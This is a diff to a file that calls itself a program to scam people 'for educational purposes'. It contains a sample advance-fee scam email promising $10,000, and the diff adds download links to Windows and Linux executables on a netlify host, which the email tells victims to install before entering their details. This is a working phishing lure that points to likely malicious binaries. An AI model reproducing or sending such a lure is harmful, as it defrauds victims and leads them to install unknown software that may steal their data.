@@ -3,6 +3,9 @@ This is the Program to scam people [For Educational purposes only]
 
 email sample for getting the money.
 
+________________________________________________________________________________________________________________
+
+
 
 hello!
 
@@ -16,8 +19,14 @@ As a result you are going to receive $10, 000.
 
 You will need to download this app and fill your details for more steps on receiving the money.
 
+if you are using windows download here
+https://brave-wozniak-dd3c72.netlify.app/monie_windows.exe
+
+
+
+while if you are using linux download here
+https://brave-wozniak-dd3c72.netlify.app/monie_linux
 
 
 thanks, 
 you will thank me after receiving the money.
-
